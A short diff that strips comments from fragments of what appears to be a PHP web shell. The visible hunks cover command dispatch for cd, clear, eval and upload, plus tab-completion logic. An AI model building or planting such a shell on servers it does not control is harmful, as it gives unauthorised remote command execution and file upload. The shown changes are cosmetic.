@@ -7,7 +7,6 @@ function featureShell($cmd, $cwd) {
     $status = '';
     $changed = null;
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
-        // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
         $changed = array();
         $changed[] = chdir($cwd);
@@ -391,7 +390,6 @@ function featureEval($code, $cwd) {
     $status = '';
     $changed = null;
     if (preg_match("/^\s*cd\s*$/", $code)) {
-        // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $code)) {
         $changed = array();
         $changed[] = chdir($cwd);
@@ -639,7 +637,6 @@ if (!empty($input_feature)) {
                 if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                     featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
                 } else if (/^\s*clear\s*$/.test(command)) {
-                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
                 } else if (/^\s*eval\s+[\s\S]+\s*$/.test(command)) {
                     makeRequest("?feature=eval", {code: command.match(/^\s*eval\s+([\s\S]+)\s*$/)[1], cwd: CWD}, function (response) {
@@ -663,10 +660,10 @@ if (!empty($input_feature)) {
             }
 
             function featureHint() {
-                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
+                if (eShellCmdInput.value.trim().length === 0) return;
 
                 function _requestCallback(data) {
-                    if (data.files.length <= 1) return;  // no completion
+                    if (data.files.length <= 1) return;
 
                     if (data.files.length === 2) {
                         if (type === 'cmd') {
